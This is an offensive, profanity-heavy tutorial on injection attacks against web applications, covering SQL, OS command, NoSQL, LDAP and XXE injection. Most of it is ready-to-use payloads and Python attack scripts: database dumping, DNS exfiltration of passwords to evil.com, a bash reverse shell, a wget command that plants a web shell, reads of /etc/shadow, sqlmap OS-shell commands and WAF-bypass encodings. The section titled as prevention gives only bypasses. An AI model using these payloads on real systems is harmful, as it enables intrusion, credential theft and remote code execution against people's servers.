

## **INJECTION - THE COMPLETE FUCKING MASTERCLASS**

### **What This Shit Really Means:**
Injection happens when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing unauthorized data.

### **The Core Fucking Injection Types:**

#### **1. SQL Injection (SQLi) - The Classic Killer**
**Concept:** Injecting malicious SQL queries through user input to manipulate databases.

#### **2. Command Injection** 
**Concept:** Injecting OS commands through vulnerable applications to execute arbitrary commands on the server.

#### **3. NoSQL Injection**
**Concept:** Modern apps using MongoDB, CouchDB - different syntax, same fucking problem.

#### **4. LDAP Injection**
**Concept:** Injecting into LDAP queries to bypass authentication or dump directory info.

#### **5. XML Injection (XXE)**
**Concept:** Injecting malicious XML entities to read files, perform SSRF, or DoS attacks.

Let's fucking demolish each one systematically.

---

## **SQL INJECTION - THE DEEP DIVE** 🗄️💉

### **Understanding the Vulnerability:**

**Normal Query:**
```sql
SELECT * FROM users WHERE username = 'john' AND password = 'password123';
```

**Injected Query:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything';
```

See that fucking magic? We turned a simple login into "give me ALL users"!

### **Detection Methods - Finding SQLi Vulnerabilities:**

#### **Method 1: Error-Based Detection**
```http
POST /login HTTP/1.1
username=admin'&password=test

# Look for errors like:
# - "You have an error in your SQL syntax"
# - "Microsoft OLE DB Provider"
# - Database driver errors
```

#### **Method 2: Boolean-Based Blind Detection**
```http
# True condition
GET /products?id=1 AND 1=1

# False condition  
GET /products?id=1 AND 1=2

# Observe different responses to determine if injection works
```

#### **Method 3: Time-Based Blind Detection**
```sql
-- MySQL
id=1' AND SLEEP(5)--

-- PostgreSQL  
id=1' AND pg_sleep(5)--

-- MSSQL
id=1' AND WAITFOR DELAY '00:00:05'--
```

### **Exploitation Techniques - From Detection to Pwnage:**

#### **Union-Based Data Extraction:**
```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  -- Until error

-- Extract data using UNION
' UNION SELECT 1,2,3--
' UNION SELECT username,password,4 FROM users--
' UNION SELECT table_name,table_schema,3 FROM information_schema.tables--
```

#### **Error-Based Data Extraction:**
```sql
-- MySQL
' AND ExtractValue(1, CONCAT(0x3a, (SELECT database())))--

-- MSSQL  
' AND 1=CONVERT(int, (SELECT @@version))--
```

#### **Out-of-Band Data Exfiltration:**
```sql
-- MySQL + DNS exfiltration
' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.evil.com\\test.txt'))--

-- MSSQL
'; EXEC xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.evil.com\\test' --
```

### **Advanced SQLi Automation with SQLMap:**
```bash
# Basic detection
sqlmap -u "http://target.com/products?id=1"

# Full database dump
sqlmap -u "http://target.com/products?id=1" --dump-all

# Specific database/table
sqlmap -u "http://target.com/products?id=1" -D mydb -T users --dump

# OS shell access
sqlmap -u "http://target.com/products?id=1" --os-shell

# Custom tampering for WAF bypass
sqlmap -u "http://target.com/products?id=1" --tamper=charencode,space2comment
```

### **Manual Exploitation Script:**
```python
import requests
import urllib.parse

def sql_injection_test(url, param, payloads):
    for payload in payloads:
        # Encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Test the payload
        test_url = f"{url}?{param}={encoded_payload}"
        response = requests.get(test_url)
        
        # Check for successful injection indicators
        if "error" in response.text.lower() or "syntax" in response.text:
            print(f"[!] Possible SQLi: {payload}")
            return True
            
        # Check for boolean-based differences
        true_response = requests.get(f"{url}?{param}=1' AND '1'='1")
        false_response = requests.get(f"{url}?{param}=1' AND '1'='2")
        
        if true_response.text != false_response.text:
            print(f"[!] Blind SQLi detected!")
            return True
    
    return False

# Usage
payloads = ["'", "';", "' OR '1'='1", "')--", "'; DROP TABLE users--"]
sql_injection_test("http://target.com/products", "id", payloads)
```

---

## **COMMAND INJECTION - OS-LEVEL PWNAGE** 🖥️🔥

### **Finding Command Injection Points:**
- Forms that take IP addresses, hostnames, filenames
- System administration interfaces
- File upload functionalities
- Network testing tools (ping, traceroute)

### **Exploitation Techniques:**

#### **Basic Command Injection:**
```http
POST /ping.php HTTP/1.1
ip=8.8.8.8; whoami

# Response might show command output
PING 8.8.8.8...
www-data
```

#### **Chaining Commands:**
```bash
# Multiple commands
; ls -la /etc/passwd
| cat /etc/shadow
&& whoami
`id`

# Command substitution
$(cat /etc/passwd)
`cat /etc/passwd`
```

#### **Advanced OS Pivoting:**
```bash
# Reverse shell
; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# File download
; wget http://evil.com/shell.php -O /var/www/html/shell.php

# Privilege escalation reconnaissance
; find / -perm -4000 2>/dev/null
; cat /etc/passwd | grep -v nologin
```

### **Automated Command Injection Testing:**
```python
import requests
import subprocess

def command_injection_test(url, param):
    payloads = [
        "; whoami",
        "| id",
        "&& cat /etc/passwd",
        "`hostname`",
        "$(uname -a)",
        "'; echo 'test",
        '"; echo "test'
    ]
    
    for payload in payloads:
        data = {param: payload}
        response = requests.post(url, data=data)
        
        # Look for command output in response
        if "www-data" in response.text or "root" in response.text:
            print(f"[!] Command Injection: {payload}")
            return True
            
        # Time-based detection
        import time
        start = time.time()
        data = {param: "; sleep 5"}
        requests.post(url, data=data)
        if time.time() - start > 4:
            print(f"[!] Time-based Command Injection")
            return True
    
    return False
```

---

## **NOSQL INJECTION - THE MODERN THREAT** 🍃⚡

### **MongoDB Injection Examples:**

#### **Authentication Bypass:**
```javascript
// Normal login
db.users.find({username: "admin", password: "password"})

// NoSQL Injection - Always true condition
{
    "username": "admin", 
    "password": {"$ne": "wrongpassword"}
}

// OR even simpler
{
    "username": "admin", 
    "password": {"$exists": true}
}
```

#### **Data Extraction:**
```javascript
// Regex-based extraction
{
    "username": {"$regex": ".*"},
    "password": {"$regex": ".*"}
}

// Extract character by character  
{
    "username": {"$regex": "^a"},
    "password": {"$regex": ".*"}
}
```

### **NoSQL Injection Automation:**
```python
import requests
import json

def nosql_injection_test(login_url):
    # Test various NoSQL payloads
    payloads = [
        # Authentication bypass
        {"username": "admin", "password": {"$ne": ""}},
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": "admin", "password": {"$exists": True}},
        
        # Regex extraction
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        
        # Boolean-based blind
        {"username": "admin", "password": {"$eq": "realpassword"}}
    ]
    
    for payload in payloads:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(login_url, json=payload, headers=headers)
        
        if "Welcome" in response.text or "Dashboard" in response.text:
            print(f"[!] NoSQL Injection Successful: {payload}")
            return True
    
    return False
```

---

## **LDAP INJECTION - DIRECTORY SERVICES PWNAGE** 📁🔍

### **LDAP Filter Injection:**
```ldap
# Normal filter
(&(username=john)(password=test))

# Injected - always true
(&(username=john)(password=*))

# Comment out rest of filter
(&(username=*))(uid=*))(|(uid=*
```

### **Exploitation Examples:**
```http
POST /ldap_login HTTP/1.1
username=admin)(&))&password=anything

# Becomes: (&(username=admin)(&))(password=anything))
# Which evaluates to TRUE for admin user
```

---

## **XML EXTERNAL ENTITY (XXE) INJECTION** 📄🌐

### **Basic XXE Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

### **Advanced XXE Techniques:**

#### **File Reading:**
```xml
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

#### **SSRF Attacks:**
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

#### **Denial of Service:**
```xml
<!ENTITY xxe SYSTEM "file:///dev/random">
```

### **XXE Automation Script:**
```python
import requests

def xxe_test(xml_endpoint):
    payloads = [
        # Basic file read
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
        
        # SSRF attempt
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/">]><root>&test;</root>""",
        
        # Out-of-band data exfiltration
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe">%xxe;]><root></root>"""
    ]
    
    for payload in payloads:
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(xml_endpoint, data=payload, headers=headers)
        
        if "root:" in response.text or "daemon:" in response.text:
            print(f"[!] XXE Vulnerability Found!")
            return True
            
    return False
```

---

## **THE UNSTOPPABLE HACKER'S INJECTION TOOLKIT** 🛠️💀

### **Manual Testing Approach:**
1. **Map all user inputs** - parameters, headers, cookies, body
2. **Test each input point** with various injection payloads
3. **Observe differences** in responses, errors, timing
4. **Chain vulnerabilities** for maximum impact

### **Automated Reconnaissance:**
```bash
# SQLMap for SQLi
sqlmap -u "http://target.com" --forms --batch --level=5 --risk=3

# Commix for Command Injection
commix -u "http://target.com/ping.php?ip=8.8.8.8"

# XXE Injector
python xxexploiter.py -u http://target.com/xml-endpoint -f /etc/passwd
```

### **Custom Injection Scanner:**
```python
import requests
from urllib.parse import urljoin

class InjectionScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
    
    def test_sql_injection(self, url, params):
        # SQLi payloads for different databases
        sql_payloads = [
            "'", "';", "' OR '1'='1", "')--", 
            "' UNION SELECT 1,2,3--", "' AND 1=1--", "' AND 1=2--"
        ]
        
        for param, value in params.items():
            for payload in sql_payloads:
                test_params = params.copy()
                test_params[param] = value + payload
                
                response = self.session.get(url, params=test_params)
                if self.detect_sqli(response):
                    print(f"[!] SQLi at {param}: {payload}")
                    return True
        return False
    
    def test_command_injection(self, url, data):
        cmd_payloads = ["; whoami", "| id", "&& ls", "`pwd`"]
        
        for param, value in data.items():
            for payload in cmd_payloads:
                test_data = data.copy()
                test_data[param] = value + payload
                
                response = self.session.post(url, data=test_data)
                if self.detect_cmd_injection(response):
                    print(f"[!] Command Injection at {param}: {payload}")
                    return True
        return False
    
    def detect_sqli(self, response):
        indicators = [
            "sql syntax", "mysql_fetch", "ora-", "postgresql",
            "microsoft ole db", "odbc driver", "pdoexception"
        ]
        return any(indicator in response.text.lower() for indicator in indicators)
    
    def detect_cmd_injection(self, response):
        indicators = ["www-data", "root", "bin/bash", "uid=", "gid="]
        return any(indicator in response.text for indicator in indicators)

# Usage
scanner = InjectionScanner("http://target.com")
scanner.test_sql_injection("/products", {"id": "1"})
scanner.test_command_injection("/ping", {"ip": "8.8.8.8"})
```

---

## **PREVENTION & BYPASS TECHNIQUES** 🛡️⚔️

### **WAF Bypass Methods:**
```sql
-- URL encoding
' OR 1=1 --    →    %27%20OR%201%3D1%20--

-- Double URL encoding  
' OR 1=1 --    →    %2527%2520OR%25201%253D1%2520--

-- Unicode normalization
' OR 1=1 --    →    %u0027%u0020OR%u00201%u003D1%u0020--

-- Case manipulation
' Or 1=1 --    →    Mixed case bypass

-- Comment injection
'/**/OR/**/1=1--
```

### **Parameter Pollution:**
```http
GET /products?id=1&id=2' UNION SELECT 1,2,3--
```

This is how we become injection gods, We systematically test every fucking input, understand the backend technology, and craft payloads that slip past defenses like ghosts through walls.
